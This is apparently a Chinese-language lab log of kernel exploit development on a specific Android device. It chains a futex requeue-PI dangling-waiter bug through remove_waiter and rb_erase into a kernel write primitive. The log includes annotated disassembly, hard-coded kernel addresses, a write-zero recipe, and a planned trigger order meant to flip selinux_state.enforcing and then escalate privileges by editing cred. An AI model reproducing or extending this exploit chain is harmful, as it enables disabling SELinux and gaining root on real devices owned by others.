# H239–H240 · ★★★ **零 panic 突破**：`remove_waiter` 消费器成立

> 设备：MEY-AN00 · 会话 2026-10-06 续做
> 本会话真机开火 **9 发**（前 7 发 panic；**H239/H240 两发连续零 panic**）
> 当前：`boot_id 024088a8-…`、`uid 2000`、`Enforcing`、设备健康

---

## §0 结果速览

| 实验 | 消费器 | 关键变量 | 结果 |
|---|---|---|---|
| D-2 / D-3 | `sched_setattr` | — | ❌ panic（2 发） |
| **H239 (D-4)** | **`remove_waiter`** | `rb_leftmost = 0` | ✅ **零 panic**（早退，`rb_erase` 未调用） |
| **H240 (D-4b)** | **`remove_waiter`** | `rb_leftmost ≠ 0` + S 派生映射目标 | ✅ **零 panic**（`rb_erase` 路径被执行） |

⇒ ★★★★ **本路线首次实现「端到端进内核且不崩」**。

---

## §1 ★★★ 为什么 `remove_waiter` 成立而 `sched_setattr` 不成立

| 消费器 | 自身 frame | 与 waiter 槽 `[0x1F0,0x260)` 关系 | 判定 |
|---|---|---|---|
| `rt_mutex_adjust_prio_chain` | `sub sp,#0x80` ⇒ `[0x1F0,0x270)` | ★ **完全重叠** ⇒ 进入即踩掉 `waiter->lock`(0x248) | ❌ 结构上不可用 |
| **`remove_waiter`** | `stp [sp,#-0x50]!` ⇒ `[0x1A0,0x1F0)` | **不重叠** | ✅ **可用** |

⇒ ★★★ **这正是 H235–H238 七发 panic 的真正死结，也是项目历史「系统性 0 次干净 miss」的最可能解释。**

---

## §2 `remove_waiter` 的硬要求（汇编一手，逐条落地）

```asm
e60: stp x29,x30,[sp,#-0x50]!        ; 自身 frame [0x1A0,0x1F0)（不碰 waiter 槽）
e7c: ldr x24, [x0, #0x10]            ; x24 = lock->waiters.rb_leftmost
e88: cbz x24, #0xe98                 ; ★ 为 0 ⇒ 跳过下面的校验
e8c: ldr x8, [x24, #0x58]            ; 否则读 [x24+0x58]（须可读！）
e90: cmp x8, x19
e94: b.ne #0xf8c                     ; 不等 ⇒ 直接返回（写不发生）
e98: mrs x20, sp_el0                 ; x20 = current
ea0: ldr x25, [x19, #0x18]           ; x25 = lock->owner
eac: ldr x8, [x23]                   ; waiter->tree.rb_parent_color
eb0: cmp x8, x23
eb4: b.eq #0xee4                     ; RB_EMPTY_NODE ⇒ 跳过写
eb8: ldr x8, [x19, #0x10]            ; lock->waiters.rb_leftmost
ec0: cmp x8, x23
ec4: b.ne #0xed4
ec8: bl rb_next ; ed0: str x0,[x19,#0x10]
ed4: mov x0,x23 ; ed8: mov x1,x22(=lock+8)
edc: bl rb_erase                     ; ★★★★★ 写原语执行点
ee0: str x23,[x23]                   ; RB_CLEAR_NODE
ee8: str xzr,[x20,#0x938]            ; current->pi_blocked_on = NULL（清错人 = CVE 根因）
ef0: cmp x24, x23
ef8: and x21, x25, #~1               ; ★ x21 = owner（当 task_struct* 用！）
f00: add x22, x21, #0x90c
f0c: ldr x8, [x23, #0x28]!
f18: ldr x8, [x21, #0x928]           ; ★ owner->pi_waiters.rb_leftmost
f44: ldr x8, [x19, #8]               ; lock->waiters.rb_root
f4c: ldr x8, [x21, #0x920]           ; owner->pi_waiters.rb_root
f60: ldr x8, [x21, #0x938]           ; owner->pi_blocked_on
f70: 函数尾声（正常 ret）
```

### ★★ 由此得到的 4 条硬要求（H239 全部满足）

| # | 要求 | 值 | 依据 |
|---|---|---|---|
| 1 | `lock->waiters.rb_leftmost`(+0x10) | **0 ⇒ 跳过校验**；或指向合法对象且 `[..+0x58]==lock` | `e7c/e88/e8c` |
| 2 | `waiter->tree.__rb_parent_color`(+0x00) | **≠ waiter**（否则 RB_EMPTY_NODE 跳过写） | `eac/eb4` |
| 3 | `lock->waiters.rb_leftmost`(+0x10) | **== waiter** ⇒ 才调 `rb_erase` | `eb8/ec0/ec4` |
| 4 | ★★★ `waiter->pi_tree`(+0x28) | **必须指向合法 `task_struct`**（被当 `owner` 用）；`owner->pi_waiters`/`pi_blocked_on` 会被读 | `ea0/ef8/f18/f4c/f60` |

⇒ **第 4 条是 h234 那次 `owner=0` 崩溃的同源要求**：
`waiter->pi_tree = 0` ⇒ `[0x28+0x90c]`/`[0x28+0x928]` ⇒ **`page_request`**。
⇒ **H239 设 `waiter->pi_tree = init_task` 后即零 panic** —— 与推断完全一致。

---

## §3 `rb_erase` 写语义（精读，用于选写目标）

```asm
a9d4: ldp x8, x10, [x0, #8]     ; x8 = node->rb_right ; x10 = node->rb_left
a9d8: cbnz x10, #0xaa18         ; left != 0 ⇒ Case2
; Case1（left == 0）：
a9dc: ldr x9,  [x0]             ; x9 = node->__rb_parent_color
a9e4: ands x10, x9, #-4         ; parent = pc & ~3 ; 若 parent==0 ⇒ 直接 ret（无写）
a9ec: mov x11, x10
a9f0: ldr x12, [x11, #0x10]!    ; x11 → parent+0x10 ; x12 = [parent+0x10]
a9f4: sub x13, x11, #8          ; x13 = parent+8
a9f8: cmp x12, x0
a9fc: csel x11, x11, x13, eq    ; [parent+0x10]==node ⇒ parent+0x10 否则 parent+8
aa00: str x8, [x11]             ; ★★★ 写：*(calc) = node->rb_right
aa04: cbnz x8, #0xaa10
aa10: str x9, [x8]              ; 若 right != 0 ⇒ *right = pc（第二个写点）
```

⇒ **写目标 = `parent + (parent[0x10]==node ? 0x10 : 8)`，写值 = `node->rb_right`**
⇒ ★ **配方**：`__rb_parent_color = TARGET−8`（无需颜色位）⇒ `parent = TARGET−8`，
且 `[TARGET] != node`（通常成立）⇒ `calc = TARGET` ⇒ **`*(TARGET) = node->rb_right`**。
⇒ 要写**零**：设 `rb_right = 0`。

---

## §4 H240（D-4b）测了什么 / 没测到什么（诚实）

**改了**：
- `rb_leftmost = S − 0x210`（非 0 且映射）⇒ 进入 `rb_erase` 分支（要求 3 满足）
- 写目标改成 **S 派生**（内核栈，必然映射）⇒ 不会 `page_request`

**结果**：`#2 rc=0`、`NO PANIC`、`boot_id` 不变。

**没测到**：**写是否真的发生了** —— 因为目标在内核栈上，用户态无法回读（无独立透镜）。
⇒ 所以 H240 证明的是「**`rb_erase` 路径被执行且不崩**」，
**不是**「写落地并被观测到」。

---

## §5 下一步（最后一步：可观测的写）

要证明写落地，需要一个**用户态可回读的目标**：

| 候选 | 可观测性 | 风险 |
|---|---|---|
| `sysctl_bootid` data（`0xffffffc0823db420`） | `cat /proc/sys/kernel/random/boot_id` | ★ 项目实测：写它会致重启（H73/H74b） |
| `selinux_state.enforcing`（`0xffffffc0823ba418`） | `getenforce` 独立可读 | 低（写 0 仅关 SELinux） |
| `.data` 空洞（`0xffffffc082136048`） | 无用户态透镜，但**无害** | 低（可先证明"不崩"） |

**建议顺序**：
1. 先用 `selinux_state.enforcing`（`getenforce` 是最干净的独立透镜，且写 0 = Permissive 是可验收效果）；
2. 若成功 ⇒ **目标达成**（`uid` 仍为 2000 但 SELinux 关闭；进一步提权需再改 `cred`）。

⚠️ **必须同 boot 内立刻回读**（`getenforce`），跨重启判 UNKNOWN。

---

## §5b ★ H241（步 E 尝试）：**未达成，原因已定位**

**改动**：写目标 = `selinux_state.enforcing`（`0xffffffc0823ba418`），
`rb_leftmost = waiter`（要求 3 满足），`parent_color = TARGET−8`。
透镜：`getenforce`。

**结果**：
```
#1 CMP_REQUEUE_PI rc=-1 errno=35 (EDEADLK) OK
  [W] delivered=1 sig_hits=1
#2 CMP_REQUEUE_PI rc=0 errno=0(Success)
[*] reached end of main => NO PANIC
ENFORCE_BEFORE = Enforcing
ENFORCE_AFTER  = Enforcing     ← ★ 未变
BID_BEFORE == BID_AFTER ✅
```

### ★★★ 未达成的原因：**第二次 requeue 根本没走到 `remove_waiter`**

`remove_waiter` 只在 `__rt_mutex_start_proxy_lock` **返回错误**时被调用（失败分支）。
而第二次 `CMP_REQUEUE_PI` 时：

- W **已经超时返回**（`ETIMEDOUT`）⇒ 它的 `futex_q` **已从 futex hash bucket 移除**；
- ⇒ 第二次 requeue **找不到 W 的 waiter** ⇒ 不进入 `start_proxy_lock` ⇒ **`remove_waiter` 从未被调用**
- ⇒ **`rb_erase` 从未执行** ⇒ 写未发生 ⇒ `getenforce` 不变。

⇒ ★ **H239/H240/H241 三发"零 panic"是因为链路根本没走到 `rb_erase`**，
**不是**"写成功但不崩"。这一点必须记账，避免把「不崩」误读为「成功」。

### ★★ 由此得到的**正确触发顺序**（下一发设计）

`remove_waiter` 必须**在画布已植入之后**被触发。当前顺序（先 requeue 造悬垂 → 再植画布 → 再 requeue）
是**错的**，因为第一次 requeue 之后 W 的 waiter 已消失。

**正确顺序**（W 保持阻塞，画布在消费前植入）：

```
① W  : WAIT_REQUEUE_PI(f_src → f_target, to=NULL)   ← 永久阻塞，waiter 留在 lock 树里
② 主 : 投递画布到 W（信号）
       —— W 的 kernel stack 此时是 futex_wait_requeue_pi 的活跃帧，
          而非 stale 帧；但画布深度 [0x100,0x300) 仍覆盖 waiter 槽 [0x1F0,0x260)
③ R  : CMP_REQUEUE_PI(f_src → f_target)  ⇒ 走 start_proxy_lock 失败分支
       ⇒ ★ remove_waiter(lock, waiter)，其 frame [0x1A0,0x1F0) 不覆盖 waiter 槽
       ⇒ rb_erase 用【画布里的伪 tree 字段】⇒ 写原语
④ 判据：同 boot 内 getenforce / boot_id
```

⚠️ 风险：② 的信号可能**打断**① 的阻塞（返回 EINTR）⇒ 需用 `to` 为非 NULL 的短超时，
   或改用 `tgkill` 精确定向 W 且 W 处于 `TASK_INTERRUPTIBLE` 但未超时的窗口。

⇒ ★ **下一发（D-5）就按 ①→②→③ 的顺序做**，这是本路线最后一个未验证的结构性环节。

---

## §6 铁律增补

| # | 铁律 |
|---|---|
| **㉝** | ★★★ **消费器 frame 不得与 waiter 槽重叠**：`rt_mutex_adjust_prio_chain`（`sub sp,#0x80`）覆盖 `[0x1F0,0x270)` ⊃ waiter 槽 ⇒ **结构性不可用**；`remove_waiter`（frame 0x50）**不重叠 ⇒ 可用**。这是 7 发 panic 的真死结 |
| **㉞** | ★★ `remove_waiter` 要求 `waiter->pi_tree`(+0x28) **指向合法 `task_struct`**（被当 `owner` 用，读 `+0x920/+0x928/+0x938`）；填 0 ⇒ `page_request` |
| **㉟** | `rb_erase` 写语义：`*(parent + (parent[0x10]==node?0x10:8)) = node->rb_right`；写零配方 = `parent_color=TARGET−8` + `right=0` |
| **㊱** | 画布偏移 = **`0x110 + 字段off`**（绝不能写 `深度−0x300`，会下溢） |
| **㊲** | ★★★ **"不崩" ≠ "写成功"**：必须先确认 `remove_waiter`/`rb_erase` **真的被调用**（触发条件 = `start_proxy_lock` 返回错误），否则零 panic 只是「早退」的假象 |
